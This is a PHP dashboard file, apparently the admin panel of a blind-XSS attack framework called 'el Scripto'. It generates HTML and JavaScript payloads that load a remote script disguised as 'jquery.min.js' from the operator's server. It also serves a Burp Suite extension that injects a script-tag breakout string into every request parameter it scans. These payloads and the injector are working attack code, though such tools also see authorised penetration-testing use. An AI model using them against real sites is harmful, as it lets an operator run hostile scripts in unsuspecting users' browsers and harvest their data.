@@ -1,0 +1,543 @@
+<?php
+if(file_exists("./config.html")){
+    include("./config.html");
+}else{
+    die("Config file does not exist<script>setTimeout(function(){location='./install.html'},1500)</script>");
+}
+
+
+session_start();
+
+if(isset($_SESSION) && !isset($_SESSION['username']) || $_SESSION['username'] != $adminlogin){
+  header("Location: login.html");
+  die;
+}
+
+if(isset($_GET['logout'])){
+    session_destroy();
+    header("Location: login.html");
+    die;
+}
+
+$conn = new mysqli($dblocation, $dbuser, $dbpass, $dbname);
+
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+} 
+
+$sql = "SELECT count(*) FROM exploits";
+$result = $conn->query($sql);
+if ($result->num_rows > 0) {
+    // output data of each row
+    while($row = $result->fetch_assoc()) {
+        $expcount = $row["count(*)"];
+    }
+} else {
+    
+}
+
+$sql = "SELECT count(*) FROM reports where custom!='Inclusion'";
+$result = $conn->query($sql);
+if ($result->num_rows > 0) {
+    // output data of each row
+    while($row = $result->fetch_assoc()) {
+        $repcount = $row["count(*)"];
+    }
+} else {
+    
+}
+
+$sql = "SELECT count(*) FROM reports where custom='Inclusion'";
+$result = $conn->query($sql);
+if ($result->num_rows > 0) {
+    // output data of each row
+    while($row = $result->fetch_assoc()) {
+        $inccount = $row["count(*)"];
+    }
+} else {
+    
+}
+
+
+if(isset($_POST['getExt']) && $_POST['getExt']=='1'){
+
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename=elScripto.py');
+    header('Content-Transfer-Encoding: binary');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+
+die('from burp import IBurpExtender
+from burp import IScannerCheck
+from burp import IScanIssue
+from array import array
+import base64
+import random
+
+
+class BurpExtender(IBurpExtender, IScannerCheck):
+
+    #
+    # implement IBurpExtender
+    #
+
+    def registerExtenderCallbacks(self, callbacks):
+        # keep a reference to our callbacks object
+        self._callbacks = callbacks
+
+        # obtain an extension helpers object
+        self._helpers = callbacks.getHelpers()
+
+        # set our extension name
+        callbacks.setExtensionName("elScripto blind XSS checks")
+
+        # register ourselves as a custom scanner check
+        callbacks.registerScannerCheck(self)
+
+    # helper method to search a response for occurrences of a literal match string
+    # and return a list of start/end offsets
+
+    def _get_matches(self, response, match):
+        matches = []
+        start = 0
+        reslen = len(response)
+        matchlen = len(match)
+        while start < reslen:
+            start = self._helpers.indexOf(response, match, True, start, reslen)
+            if start == -1:
+                break
+            matches.append(array(\'i\', [start, start + matchlen]))
+            start += matchlen
+
+        return matches
+
+    #
+    # implement IScannerCheck
+    #
+
+    def doPassiveScan(self, baseRequestResponse):
+        # look for matches of our passive check grep string
+        return None
+
+    def doActiveScan(self, baseRequestResponse, insertionPoint):
+
+        
+        # make a request containing our injection test in the insertion point
+        rndi = str(random.randint(100000000, 999999999999))
+        checkRequest = insertionPoint.buildRequest(bytearray("</script></textarea/\'\\"--><script src='.str_replace('http://', '//', str_replace('/index.html', '', $_SERVER["HTTP_REFERER"])).'/jquery.min.js?ver=1&rnd=" + rndi + "></script>"))
+        f = open("log.tmp", "a")
+        f.write(rndi + " : " + base64.b64encode(checkRequest) + "\n\n")
+        f.close()
+        checkRequestResponse = self._callbacks.makeHttpRequest(
+                baseRequestResponse.getHttpService(), checkRequest)
+
+        # look for matches of our active check grep string
+        return None
+
+    def consolidateDuplicateIssues(self, existingIssue, newIssue):
+        # This method is called when multiple issues are reported for the same URL 
+        # path by the same extension-provided check. The value we return from this 
+        # method determines how/whether Burp consolidates the multiple issues
+        # to prevent duplication
+        #
+        # Since the issue name is sufficient to identify our issues as different,
+        # if both issues have the same name, only report the existing issue
+        # otherwise report both issues
+        if existingIssue.getIssueName() == newIssue.getIssueName():
+            return -1
+
+        return 0
+
+#
+# class implementing IScanIssue to hold our custom scan issue details
+#
+class CustomScanIssue (IScanIssue):
+    def __init__(self, httpService, url, httpMessages, name, detail, severity):
+        self._httpService = httpService
+        self._url = url
+        self._httpMessages = httpMessages
+        self._name = name
+        self._detail = detail
+        self._severity = severity
+
+    def getUrl(self):
+        return self._url
+
+    def getIssueName(self):
+        return self._name
+
+    def getIssueType(self):
+        return 0
+
+    def getSeverity(self):
+        return self._severity
+
+    def getConfidence(self):
+        return "Certain"
+
+    def getIssueBackground(self):
+        pass
+
+    def getRemediationBackground(self):
+        pass
+
+    def getIssueDetail(self):
+        return self._detail
+
+    def getRemediationDetail(self):
+        pass
+
+    def getHttpMessages(self):
+        return self._httpMessages
+
+    def getHttpService(self):
+        return self._httpService
+');
+
+
+
+}
+
+
+
+$files = scandir("./exploits/");
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>el Scripto dashboard</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link href="css/sb-admin.css" rel="stylesheet">
+
+    <!-- Morris Charts CSS -->
+    <link href="css/plugins/morris.css" rel="stylesheet">
+
+    <!-- Custom Fonts -->
+    <link href="css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" href="css/androidstudio.css">
+    <script src="./js/highlight.js"></script>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <script>
+    var spl = [],path=''; spl = location.href.split('/');for(i=1; i<spl.length-1;i++){path += '/' + spl[i]}
+
+    function getPayload(id,title){
+        $('#expname')[0].innerText = title;
+        $('#html')[0].innerText = '<script src="' + path + '/jquery.min.js?ver=' + id + '"><\/script>'
+        $('#javascript')[0].innerText =  'document.body.appendChild(document.createElement(\'script\')).src=\'' + path + '/jquery.min.js?ver=' + id + '\''
+        $('pre code').each(function(i, block) {
+            hljs.highlightBlock(block);
+        });
+    }
+    window.onload = function(){
+        getPayload('1','Blind XSS');
+    }
+
+
+    </script>
+</head>
+
+<body>
+
+    <div id="wrapper">
+
+        <!-- Navigation -->
+        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="index.html">el Scripto</a>
+            </div>
+            <!-- Top Menu Items -->
+                        <ul class="nav navbar-right top-nav">
+ 
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-user"></i> <?=$_SESSION["username"]?>  <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                        <li>
+                            <a href="?logout=1"><i class="fa fa-fw fa-power-off"></i> Log Out</a>
+                        </li>
+                    </ul>
+                </li>
+            </ul>
+            <!-- Sidebar Menu Items - These collapse to the responsive navigation menu on small screens -->
+            <div class="collapse navbar-collapse navbar-ex1-collapse">
+                <ul class="nav navbar-nav side-nav">
+                    <li class="active">
+                        <a href="index.html"><i class="fa fa-fw fa-dashboard"></i> Dashboard</a>
+                    </li>
+                    <li>
+                        <a href="reports.html"><i class="fa fa-fw fa-table"></i> Reports</a>
+                    </li>
+                    <li>
+                        <a href="prepare.html"><i class="fa fa-fw fa-wrench"></i> Prepare Exploits</a>
+                    </li>
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </nav>
+
+        <div id="page-wrapper">
+
+            <div class="container-fluid">
+
+                <!-- Page Heading -->
+                <div class="row">
+                    <div class="col-lg-12">
+                        <h1 class="page-header">
+                            Dashboard <small>Statistics Overview</small>
+                        </h1>
+                        <ol class="breadcrumb">
+                            <li class="active">
+                                <i class="fa fa-dashboard"></i> Dashboard
+                            </li>
+                        </ol>
+                    </div>
+                </div>
+                <!-- /.row -->
+
+                <div class="row" style="display:none">
+                    <div class="col-lg-12">
+                        <div class="alert alert-info alert-dismissable">
+                            <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
+                            <i class="fa fa-info-circle"></i>  <strong>Like SB Admin?</strong> Try out <a href="http://startbootstrap.com/template-overviews/sb-admin-2" class="alert-link">SB Admin 2</a> for additional features!
+                        </div>
+                    </div>
+                </div>
+                <!-- /.row -->
+
+                <div class="row">
+                    <div class="col-lg-3 col-md-6">
+                        <div class="panel panel-primary">
+                            <div class="panel-heading">
+                                <div class="row">
+                                    <div class="col-xs-3">
+                                        <i class="fa fa-file-code-o fa-5x"></i>
+                                    </div>
+                                    <div class="col-xs-9 text-right">
+                                        <div class="huge"><?php echo(count($files)); ?></div>
+                                        <div>Exploit templates</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <a href="./prepare.html">
+                                <div class="panel-footer">
+                                    <span class="pull-left">View Details</span>
+                                    <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
+                                    <div class="clearfix"></div>
+                                </div>
+                            </a>
+                        </div>
+                    </div>
+                    <div class="col-lg-3 col-md-6">
+                        <div class="panel panel-green">
+                            <div class="panel-heading">
+                                <div class="row">
+                                    <div class="col-xs-3">
+                                        <i class="fa fa-file-code-o fa-5x"></i>
+                                    </div>
+                                    <div class="col-xs-9 text-right">
+                                        <div class="huge"><?php echo $expcount; ?></div>
+                                        <div>Added exploits</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <a href="./prepare.html">
+                                <div class="panel-footer">
+                                    <span class="pull-left">View Details</span>
+                                    <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
+                                    <div class="clearfix"></div>
+                                </div>
+                            </a>
+                        </div>
+                    </div>
+                    <div class="col-lg-3 col-md-6">
+                        <div class="panel panel-yellow">
+                            <div class="panel-heading">
+                                <div class="row">
+                                    <div class="col-xs-3">
+                                        <i class="fa fa-eye fa-5x"></i>
+                                    </div>
+                                    <div class="col-xs-9 text-right">
+                                        <div class="huge"><?php echo $inccount; ?></div>
+                                        <div>Exploits was included</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <a href="./reports.html">
+                                <div class="panel-footer">
+                                    <span class="pull-left">View Details</span>
+                                    <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
+                                    <div class="clearfix"></div>
+                                </div>
+                            </a>
+                        </div>
+                    </div>
+                    <div class="col-lg-3 col-md-6">
+                        <div class="panel panel-red">
+                            <div class="panel-heading">
+                                <div class="row">
+                                    <div class="col-xs-3">
+                                        <i class="fa fa-exclamation-triangle fa-5x"></i>
+                                    </div>
+                                    <div class="col-xs-9 text-right">
+                                        <div class="huge"><?php echo $repcount; ?></div>
+                                        <div>Reports recieved</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <a href="./reports.html">
+                                <div class="panel-footer">
+                                    <span class="pull-left">View Details</span>
+                                    <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
+                                    <div class="clearfix"></div>
+                                </div>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                <!-- /.row -->
+
+                <div class="row" style="display:none">
+                    <div class="col-lg-12">
+                        <div class="panel panel-default">
+                            <div class="panel-heading">
+                                <h3 class="panel-title"><i class="fa fa-bar-chart-o fa-fw"></i> Area Chart</h3>
+                            </div>
+                            <div class="panel-body">
+                                <div id="morris-area-chart"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- /.row -->
+
+                <div class="row">
+                    <div class="col-lg-4" style="display:none">
+                        <div class="panel panel-default">
+                            <div class="panel-heading">
+                                <h3 class="panel-title"><i class="fa fa-long-arrow-right fa-fw"></i> Donut Chart</h3>
+                            </div>
+                            <div class="panel-body">
+                                <div id="morris-donut-chart"></div>
+                                <div class="text-right">
+                                    <a href="#">View Details <i class="fa fa-arrow-circle-right"></i></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-lg-6">
+                        <div class="panel panel-default">
+                            <div class="panel-heading">
+                                <h3 class="panel-title"><i class="fa fa-clock-o fa-fw"></i> Choose exploit</h3>
+                            </div>
+                            <div class="panel-body">
+                                <div class="list-group">
+<?php
+$sql = "SELECT * FROM exploits";
+$result = $conn->query($sql);
+if ($result->num_rows > 0) {
+    // output data of each row
+    while($row = $result->fetch_assoc()) {
+        echo "<a href=\"#\" class=\"list-group-item\"  onclick=\"getPayload('".$row["id"]."','".$row["title"]."')\">
+                                        
+                                        <i class=\"fa fa-fw fa-calendar\"></i> ".$row["title"]."
+                                    </a>";
+    }
+} else {
+    echo "0 results";
+}
+
+?>
+
+
+                                </div>
+                                <!--<div class="text-right">
+                                    <a href="#">View All Activity <i class="fa fa-arrow-circle-right"></i></a>
+                                </div>-->
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-lg-6">
+                        <div class="panel panel-default">
+                            <div class="panel-heading">
+                                <h3 class="panel-title"><i class="fa fa-money fa-fw"></i> XSS payloads for <a id="expname">Joomla</a></h3>
+                            </div>
+                            <div class="panel-body">
+                                <div class="row">
+                                    <h4> HTML:</h4>
+                                    <pre><code class="html" id="html"></code></pre>
+                                </div>
+                                <br>
+                                <div class="row">
+                                    <h4> JavaScript:</h4>
+                                    <pre><code class="javascript" id="javascript"></code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- /.row -->
+
+            </div>
+            <!-- /.container-fluid -->
+                <div class="form-group">
+                    <form method="POST">
+                        <input type="hidden" name="getExt" value="1">
+                        <button type="submit" class="btn btn-default btn-block">Download burp extension!</button>
+                    </form>
+        </div>
+
+        </div>
+        <!-- /#page-wrapper -->
+
+
+    </div>
+    <!-- /#wrapper -->
+
+    <!-- jQuery -->
+    <script src="js/jquery.js"></script>
+    <script>$('pre code').each(function(i, block) {hljs.highlightBlock(block);});</script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="js/bootstrap.min.js"></script>
+
+    <!-- Morris Charts JavaScript -->
+    <!--<script src="js/plugins/morris/raphael.min.js"></script>
+    <script src="js/plugins/morris/morris.min.js"></script>
+    <script src="js/plugins/morris/morris-data.js"></script>-->
+
+</body>
+
+</html>
+
+<?php
+
+$conn->close();
+
+?>
